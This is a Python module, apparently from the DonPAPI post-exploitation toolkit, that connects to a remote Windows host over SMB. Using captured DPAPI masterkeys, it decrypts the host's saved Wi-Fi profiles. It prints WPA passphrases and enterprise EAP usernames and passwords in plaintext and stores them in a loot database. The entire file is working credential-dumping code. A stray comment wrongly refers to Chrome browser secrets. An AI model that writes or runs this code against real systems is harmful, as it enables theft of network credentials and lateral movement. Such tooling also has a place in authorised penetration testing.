from base64 import b64encode
from typing import Any

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.wifi import WifiTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class Wifi:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        if self.context.remoteops_allowed:
            self.logger.display("Dumping Wifi profiles")
            try:
                # Collect Chrome Based Browser stored secrets
                wifi_triage = WifiTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
                wifi_creds = wifi_triage.triage_wifi()
            except Exception as e:
                self.logger.debug(f"Error while looting wifi: {e}")
            for wifi_cred in wifi_creds:
                if wifi_cred.auth.upper() in ["WPAPSK", "WPA2PSK", "WPA3SAE"]:
                    try:
                        self.logger.secret(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password.decode('latin-1')}",self.tag)
                        self.context.db.add_secret(
                            computer=self.context.host,
                            collector=self.tag,
                            password=wifi_cred.password.decode('latin-1'),
                            target=wifi_cred.ssid,
                            windows_user="SYSTEM",
                        )
                    except Exception:
                        self.logger.secret(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password}",self.tag)
                        self.context.db.add_secret(
                            computer=self.context.host,
                            collector=self.tag,
                            password=f"B64[{b64encode(wifi_cred.password)}]",
                            target=wifi_cred.ssid,
                            windows_user="SYSTEM",
                        )

                elif wifi_cred.auth.upper() in ["WPA", "WPA2"]:
                    if wifi_cred.eap_username is not None and wifi_cred.eap_password is not None:
                        self.logger.secret(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - {wifi_cred.eap_type} - Identifier: {wifi_cred.eap_username}:{wifi_cred.eap_password}",self.tag)
                        self.context.db.add_secret(
                            computer=self.context.host,
                            collector=self.tag,
                            username=wifi_cred.eap_username,
                            password=wifi_cred.eap_password,
                            target=wifi_cred.ssid,
                            program=wifi_cred.auth,
                            windows_user="SYSTEM",
                        )